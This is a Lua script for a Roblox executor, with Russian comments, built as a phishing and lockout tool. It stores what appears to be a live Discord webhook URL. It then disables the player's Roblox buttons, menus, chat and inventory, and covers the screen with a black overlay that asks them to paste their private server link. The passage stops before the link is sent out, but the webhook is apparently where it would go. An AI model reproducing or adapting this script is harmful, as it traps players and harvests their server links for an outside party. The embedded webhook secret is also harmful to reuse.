-- ФИНАЛЬНЫЙ РАБОЧИЙ СКРИПТ ДЛЯ DELTA С БЛОКИРОВКОЙ КНОПОК
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")
local ContextActionService = game:GetService("ContextActionService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local GuiService = game:GetService("GuiService")
local TweenService = game:GetService("TweenService")

-- Ваш рабочий Discord Webhook
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1426984573526474903/UlljMsh10y39SSHmyLemmpoqPyI4I1UECMzqFmbKbF9Z65xpN6n33dAItHJX16G6Zrze"

-- Функция для блокировки кнопок Roblox
local function blockRobloxButtons()
    -- Поиск и блокировка основных элементов интерфейса Roblox
    local function disableGuiElements(gui)
        for _, element in ipairs(gui:GetDescendants()) do
            if element:IsA("TextButton") or element:IsA("ImageButton") then
                -- Блокируем кнопки
                element.Active = false
                element.Selectable = false
                element.AutoButtonColor = false
                
                -- Делаем кнопки серыми и неактивными
                if element:IsA("TextButton") then
                    element.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
                    element.TextColor3 = Color3.new(0.5, 0.5, 0.5)
                end
            end
        end
    end

    -- Блокируем CoreGui элементы
    disableGuiElements(CoreGui)
    
    -- Блокируем PlayerGui элементы
    disableGuiElements(PlayerGui)
    
    -- Блокируем TopBar
    local topbar = CoreGui:FindFirstChild("TopBarApp")
    if topbar then
        topbar.Enabled = false
    end
    
    -- Блокируем меню настроек
    local settingsMenu = CoreGui:FindFirstChild("SettingsShield")
    if settingsMenu then
        settingsMenu.Enabled = false
    end
    
    -- Блокируем чат
    local chat = PlayerGui:FindFirstChild("Chat")
    if chat then
        chat.Enabled = false
    end
    
    -- Блокируем Backpack (инвентарь)
    local backpack = PlayerGui:FindFirstChild("Backpack")
    if backpack then
        backpack.Enabled = false
    end
    
    print("🔒 Все кнопки Roblox заблокированы!")
end

-- Создаем GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PrivateServerGUI"
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
ScreenGui.DisplayOrder = 9999
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = PlayerGui

-- Черный фон на весь экран
local BackgroundFrame = Instance.new("Frame")
BackgroundFrame.Name = "Background"
BackgroundFrame.Size = UDim2.new(1, 0, 1, 0)
BackgroundFrame.Position = UDim2.new(0, 0, 0, 0)
BackgroundFrame.BackgroundColor3 = Color3.new(0, 0, 0)
BackgroundFrame.BackgroundTransparency = 0
BackgroundFrame.BorderSizePixel = 0
BackgroundFrame.ZIndex = 9999
BackgroundFrame.Active = true
BackgroundFrame.Selectable = true
BackgroundFrame.Parent = ScreenGui

-- Основное окно
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0.5, 0, 0.4, 0)
MainFrame.Position = UDim2.new(0.25, 0, 0.3, 0)
MainFrame.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
MainFrame.BorderSizePixel = 2
MainFrame.BorderColor3 = Color3.new(1, 1, 1)
MainFrame.ZIndex = 10000
MainFrame.Parent = ScreenGui

local FrameStroke = Instance.new("UIStroke")
FrameStroke.Thickness = 3
FrameStroke.Color = Color3.new(1, 1, 1)
FrameStroke.Parent = MainFrame

-- Заголовок
local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "Title"
TitleLabel.Size = UDim2.new(1, 0, 0.2, 0)
TitleLabel.Position = UDim2.new(0, 0, 0.1, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "ВСТАВЬТЕ ССЫЛКУ ПРИВАТНОГО СЕРВЕРА"
TitleLabel.TextColor3 = Color3.new(1, 1, 1)
TitleLabel.TextScaled = true
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.ZIndex = 10001
TitleLabel.Parent = MainFrame
